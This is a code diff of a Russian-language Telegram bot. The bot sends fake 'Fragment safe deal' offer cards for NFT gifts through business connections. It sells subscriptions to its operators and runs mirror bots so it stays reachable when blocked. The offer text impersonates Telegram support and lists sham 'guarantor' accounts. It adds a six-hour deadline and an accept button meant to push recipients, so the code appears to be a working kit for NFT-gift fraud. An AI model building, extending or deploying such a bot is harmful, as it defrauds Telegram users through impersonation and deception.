@@ -31,11 +31,8 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Список запущенных ботов-зеркал (в памяти)
-MIRROR_BOTS = []
-
 # ==========================================
-# БАЗА ДАННЫХ (БЕЗ СБРОСА ПОДПИСОК)
+# БАЗА ДАННЫХ (СОХРАНЯЕМ ПОДПИСКИ)
 # ==========================================
 def get_db():
     os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
@@ -45,12 +42,14 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
+        # НЕ удаляем users, чтобы подписки не слетели!
         conn.execute("""CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
             sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
             my_username TEXT, stats_created INTEGER DEFAULT 0, stats_accepted INTEGER DEFAULT 0
         )""")
         
+        # Пересоздаем офферы
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("""CREATE TABLE IF NOT EXISTS offers (
             id TEXT PRIMARY KEY, nft_name TEXT, nft_slug TEXT, 
@@ -59,6 +58,7 @@ def init_db():
             created_at INTEGER
         )""")
         
+        # Зеркала
         conn.execute("""CREATE TABLE IF NOT EXISTS mirrors (
             id INTEGER PRIMARY KEY AUTOINCREMENT, 
             token TEXT UNIQUE, 
@@ -77,7 +77,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# РЕГУЛЯРКИ И ПАРСЕРЫ
+# РЕГУЛЯРКИ
 # ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -103,7 +103,7 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ОТПРАВКА / УДАЛЕНИЕ (КЛАССИЧЕСКИЙ ВИД)
+# ОТПРАВКА / УДАЛЕНИЕ (КАРТИНКА СНИЗУ)
 # ==========================================
 async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
@@ -111,7 +111,7 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
             return await bot.send_message(
                 chat_id=chat_id, text=text, business_connection_id=conn_id,
                 reply_markup=reply_markup,
-                disable_web_page_preview=False # Картинка внизу (как было)
+                disable_web_page_preview=False
             )
         except TelegramBadRequest as e:
             if "PEER_FLOOD" in str(e): await asyncio.sleep(30)
@@ -136,7 +136,7 @@ async def on_business_conn(conn: BusinessConnection):
 # ==========================================
 # МЕНЮ
 # ==========================================
-async def show_main_menu(target, uid, bot_instance=None):
+async def show_main_menu(target, uid):
     with get_db() as conn:
         user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
     
@@ -162,11 +162,8 @@ async def show_main_menu(target, uid, bot_instance=None):
         [InlineKeyboardButton(text="💎 Подписка", callback_data="buy_sub")]
     ])
     
-    # Отправка через переданный бот (главный или зеркало)
-    if isinstance(target, Message): 
-        await target.reply(text, reply_markup=kb)
-    else: 
-        await target.message.edit_text(text, reply_markup=kb)
+    if isinstance(target, Message): await target.reply(text, reply_markup=kb)
+    else: await target.message.edit_text(text, reply_markup=kb)
 
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
@@ -176,7 +173,8 @@ async def cmd_start(msg: Message):
             "/keys — ключи\n"
             "/set_default @ник — сменить получателя\n"
             "/addkey — создать ключ\n"
-            "/setbot [токен] — добавить и запустить зеркало"
+            "/setbot [токен] — добавить зеркало\n"
+            "/restartbots — перезапустить все зеркала"
         )
         return
     await show_main_menu(msg, msg.from_user.id)
@@ -187,27 +185,22 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ЗЕРКАЛА
+# ЗЕРКАЛА (МЕНЮ)
 # ==========================================
 @router.callback_query(F.data == "mirrors_menu")
 async def cb_mirrors_menu(cb: CallbackQuery):
     with get_db() as conn:
         mirrors = conn.execute("SELECT * FROM mirrors").fetchall()
     
-    if not mirrors:
-        text = "🪞 <b>Зеркала</b>\n\nСписок пока пуст."
-    else:
-        text = "🪞 <b>Зеркала бота</b>\n\nЕсли этот бот не отвечает, перейдите на одно из зеркал ниже. Ваша подписка сохранится:"
+    text = "🪞 <b>Зеркала бота</b>\n\nЕсли этот бот не отвечает, перейдите на одно из зеркал ниже. Ваша подписка сохранится:" if mirrors else "🪞 <b>Зеркала</b>\n\nСписок пока пуст."
     
     kb_list = []
     for m in mirrors:
-        link = f"https://t.me/{m['username']}" if m['username'] else f"tg://user?id={m['id']}"
+        link = f"https://t.me/{m['username']}"
         kb_list.append([InlineKeyboardButton(text=f"🔹 {m['username']}", url=link)])
     
     kb_list.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
-    kb = InlineKeyboardMarkup(inline_keyboard=kb_list)
-    
-    await cb.message.edit_text(text, reply_markup=kb)
+    await cb.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_list))
     await cb.answer()
 
 # ==========================================
@@ -350,7 +343,7 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (ТЕКСТ СВЕРХУ, КАРТИНКА ВНИЗУ)
+# ОТПРАВКА ОФФЕРА (КАРТИНКА ВНИЗУ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -373,7 +366,6 @@ async def handle_business_message(msg: Message):
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
-    # ТЕКСТ СВЕРХУ, ССЫЛКА В КОНЦЕ (картинка внизу)
     card_text = (
         f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -383,7 +375,7 @@ async def handle_business_message(msg: Message):
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
         f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
-        f"{nft_link}" # ССЫЛКА В КОНЦЕ ДЛЯ ПРЕВЬЮ ВНИЗУ
+        f"{nft_link}" # ССЫЛКА В КОНЦЕ
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -398,7 +390,7 @@ async def handle_business_message(msg: Message):
             conn.execute("UPDATE offers SET message_id=?, conn_id=? WHERE id=?", (sent.message_id, conn_id, oid))
 
 # ==========================================
-# ЛОГИКА КНОПОК
+# КНОПКИ
 # ==========================================
 @router.callback_query(F.data.startswith("accept1:"))
 async def on_accept1(cb: CallbackQuery):
@@ -445,7 +437,7 @@ async def on_reject(cb: CallbackQuery):
     await cb.answer("Вы отклонили предложение.")
 
 # ==========================================
-# АДМИН (ДОБАВЛЕНИЕ И ЗАПУСК ЗЕРКАЛ)
+# АДМИН И ЗЕРКАЛА
 # ==========================================
 @router.message(Command("keys"))
 async def cmd_keys(msg: Message):
@@ -480,57 +472,48 @@ async def cmd_setbot(msg: Message):
     token = parts[1]
     
     try:
-        # 1. Проверяем токен
         temp_bot = Bot(token=token)
         me = await temp_bot.get_me()
         username = me.username
         
-        # 2. Сохраняем в БД
         with get_db() as conn:
             conn.execute("INSERT OR REPLACE INTO mirrors (token, username, added_by) VALUES (?, ?, ?)", (token, username, msg.from_user.id))
         
-        # 3. ЗАПУСКАЕМ ЗЕРКАЛО В ФОНЕ
-        await msg.reply(f"✅ Зеркало <b>@{username}</b> добавлено. Запускаю...")
-        
-        # Фоновая задача для запуска нового бота
-        async def run_mirror(bot_token):
-            mirror_dp = Dispatcher()
-            mirror_dp.include_router(router)
-            m_bot = Bot(token=bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-            try:
-                await mirror_dp.start_polling(m_bot)
-            except Exception as e:
-                log.error(f"Ошибка зеркала: {e}")
-
-        asyncio.create_task(run_mirror(token))
-        MIRROR_BOTS.append(token)
-        
-        await msg.reply(f"🚀 Зеркало <b>@{username}</b> запущено и готово к работе!")
-        
+        await msg.reply(
+            f"✅ Зеркало <b>@{username}</b> сохранено в базу.\n\n"
+            f"⚠️ <b>Важно:</b> Чтобы оно заработало, напиши /restartbots или сделай Redeploy на Railway."
+        )
     except Exception as e:
         await msg.reply(f"❌ Ошибка: {e}")
 
+@router.message(Command("restartbots"))
+async def cmd_restartbots(msg: Message):
+    if msg.from_user.id != ADMIN_ID: return
+    await msg.reply("🔄 Перезапускаю всех ботов...")
+    # Выходим из процесса, Railway перезапустит контейнер
+    os._exit(0) 
+
+# ==========================================
+# ЗАПУСК ВСЕХ БОТОВ (ГЛАВНЫЙ ФИКС)
+# ==========================================
 async def main():
-    log.info("Starting main bot...")
+    log.info("Starting bots...")
     
-    # При запуске подгружаем все зеркала из базы и запускаем их
+    bots_to_start = [bot]
+    
     with get_db() as conn:
         mirrors = conn.execute("SELECT token, username FROM mirrors").fetchall()
     
     for m in mirrors:
-        async def run_mirror(token, uname):
-            mirror_dp = Dispatcher()
-            mirror_dp.include_router(router)
-            m_bot = Bot(token=token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-            try:
-                log.info(f"🚀 Запуск зеркала @{uname}...")
-                await mirror_dp.start_polling(m_bot)
-            except Exception as e:
-                log.error(f"Ошибка зеркала @{uname}: {e}")
+        try:
+            m_bot = Bot(token=m["token"], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+            bots_to_start.append(m_bot)
+            log.info(f"🚀 Загружено зеркало: @{m['username']}")
+        except Exception as e:
+            log.error(f"Ошибка загрузки @{m['username']}: {e}")
 
-        asyncio.create_task(run_mirror(m["token"], m["username"]))
-
-    await dp.start_polling(bot)
+    # Правильный запуск всех ботов через один Dispatcher
+    await dp.start_polling(*bots_to_start)
 
 if __name__ == "__main__":
     asyncio.run(main())
